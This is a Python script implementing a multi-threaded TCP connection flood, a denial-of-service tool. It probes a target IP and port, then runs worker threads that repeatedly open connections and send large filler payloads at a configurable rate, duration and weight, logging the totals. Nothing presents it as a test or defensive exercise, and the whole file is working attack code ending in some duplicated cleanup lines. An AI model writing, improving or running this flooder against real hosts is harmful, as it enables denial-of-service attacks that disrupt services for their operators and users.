import socket
import time
import logging
import threading
import sys

def check_tcp_target(ip, port, timeout=2):
    print(f"[INFO] Checking TCP target {ip}:{port} ...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.close()
        print("[INFO] TCP target reachable.")
        return True
    except Exception as e:
        print(f"TCP target connection error: {e}")
        return False

def tcp_worker(target_ip, target_port, stop_event, pps, stats, weight):
    min_size = 64
    max_size = 65535
    size = min_size + int((max_size - min_size) * (weight - 1) / 9)
    data = b"X" * size
    while not stop_event.is_set():
        start = time.time()
        sent = 0
        for _ in range(pps):
            if stop_event.is_set():
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((target_ip, target_port))
                try:
                    sock.sendall(data)
                except Exception:
                    pass
                sock.close()
                sent += 1
            except Exception:
                pass
        stats['sent'] += sent
        elapsed = time.time() - start
        if elapsed < 1:
            time.sleep(1 - elapsed)

def tcp_flood(target_ip, target_port, duration, pps, threads=1, weight=1):
    print(f"[INFO] Starting TCP flood on {target_ip}:{target_port} ({threads} threads, {pps} pps, {duration}s, weight {weight})")
    if not check_tcp_target(target_ip, target_port):
        print("TCP target unreachable.")
        return
    logger = logging.getLogger("tcp_flood")
    handler = logging.FileHandler("tcp_flood.log")
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)

    logger.info(f"Started TCP flood on {target_ip}:{target_port} for {duration}s at {pps} pps, {threads} threads, weight {weight}.")
    print(f"[INFO] TCP flood started on {target_ip}:{target_port} for {duration}s at {pps} pps, {threads} threads, weight {weight}.")

    stop_event = threading.Event()
    stats = {'sent': 0}
    thread_list = []
    try:
        for _ in range(threads):
            t = threading.Thread(target=tcp_worker, args=(target_ip, target_port, stop_event, pps, stats, weight))
            t.daemon = True
            t.start()
            thread_list.append(t)
        start_time = time.time()
        while time.time() - start_time < duration:
            current_sent = stats['sent']
            print(f"\r[PROGRESS] Connections sent: {current_sent}", end='', flush=True)
            time.sleep(0.5)
        stop_event.set()
    except KeyboardInterrupt:
        print("\n[INFO] Early stop requested.")
        stop_event.set()
    for t in thread_list:
        t.join()
    print(f"\n[INFO] TCP flood finished. Total connections sent: {stats['sent']}")
    logger.info(f"TCP flood finished. Total connections sent: {stats['sent']}")
    handler.close()
    logger.removeHandler(handler)
    logger.info(f"Fin TCP flood. Total connexions envoyées: {stats['sent']}")
    handler.close()
    logger.removeHandler(handler)
    logger.removeHandler(handler)
